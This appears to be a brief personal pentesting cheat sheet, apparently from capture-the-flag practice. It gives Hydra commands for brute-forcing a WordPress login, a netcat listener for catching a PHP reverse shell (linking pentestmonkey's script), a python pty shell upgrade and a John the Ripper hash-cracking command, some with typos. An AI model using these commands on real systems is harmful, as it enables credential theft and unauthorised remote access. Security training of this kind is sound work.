_______________________________________________________________________________
Hydra for web:
- with list: ```hydra -L usernameList.txt -P PasswordList.txt 10.10.12.13 http-post-form "/wp-login.php: log=^USER^&pwd=^PWD^: Invalid username"```
- singular username and password: ```hydra -l username -p fsocity dic 10.10.12.13 http-post-form "/wp-login.php: log=^USER^&pwd=^PWD^: Invalid username"```
_______________________________________________________________________________
Reverse Shell - php:
  rlwrap nc -lnvp 53
  Use this php script to send us a reverse shell from the target side - pentestmonkey :
    https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

because reverse shells don't spawn in an interactive shell, this command can spawn an interactive shell in the reverse shell:
    ```python -c 'import pty;pty.spawn("/bin/bash")'```

For more exploits check out this cheat sheet:
    https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

_______________________________________________________________________________
John the Ripper:
  john --worlist=/directory/to/worlist --format=[type of hash] [file with hash inside].txt

